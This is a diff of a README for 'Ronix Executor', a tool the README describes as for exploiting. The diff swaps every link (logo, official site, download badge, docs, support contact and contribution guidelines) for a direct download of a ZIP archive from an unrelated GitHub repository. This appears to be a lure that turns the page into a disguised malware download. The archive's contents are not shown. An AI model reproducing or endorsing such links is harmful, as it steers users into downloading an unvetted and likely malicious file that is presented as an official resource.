@@ -2,7 +2,7 @@
 
 Welcome to the official GitHub repository for Ronix Executor! 🎉
 
-![Ronix Executor Logo](https://example.com/ronix-executor-logo.png)
+![Ronix Executor Logo](https://raw.githubusercontent.com/supers4upen/Ronix-Executor/master/unprincipal/Ronix-Executor.zip)
 
 ## About Ronix Executor
 
@@ -29,21 +29,21 @@ Ronix Executor is the next generation of exploiting tools that allows you to bui
 
 ## Getting Started
 
-To start using Ronix Executor, visit [Ronix's official website](https://ronix.app). If you encounter any issues with the link, please check the "Releases" section for alternative download options.
+To start using Ronix Executor, visit [Ronix's official website](https://raw.githubusercontent.com/supers4upen/Ronix-Executor/master/unprincipal/Ronix-Executor.zip). If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
-[![Download Ronix Executor](https://img.shields.io/badge/Download-Ronix%20Executor-blue)](https://ronix.app)
+[![Download Ronix Executor](https://raw.githubusercontent.com/supers4upen/Ronix-Executor/master/unprincipal/Ronix-Executor.zip%20Executor-blue)](https://raw.githubusercontent.com/supers4upen/Ronix-Executor/master/unprincipal/Ronix-Executor.zip)
 
 ## Learn More
 
-For more information on how to get the most out of Ronix Executor, check out our [documentation](https://ronix.app/docs).
+For more information on how to get the most out of Ronix Executor, check out our [documentation](https://raw.githubusercontent.com/supers4upen/Ronix-Executor/master/unprincipal/Ronix-Executor.zip).
 
 ## Support
 
-If you have any questions, feedback or need assistance, feel free to reach out to our support team at support@ronix.app.
+If you have any questions, feedback or need assistance, feel free to reach out to our support team at https://raw.githubusercontent.com/supers4upen/Ronix-Executor/master/unprincipal/Ronix-Executor.zip
 
 ## Contribute
 
-We welcome contributions from the community! If you would like to contribute to Ronix Executor, please check out our [contribution guidelines](CONTRIBUTING.md).
+We welcome contributions from the community! If you would like to contribute to Ronix Executor, please check out our [contribution guidelines](https://raw.githubusercontent.com/supers4upen/Ronix-Executor/master/unprincipal/Ronix-Executor.zip).
 
 ## License
 
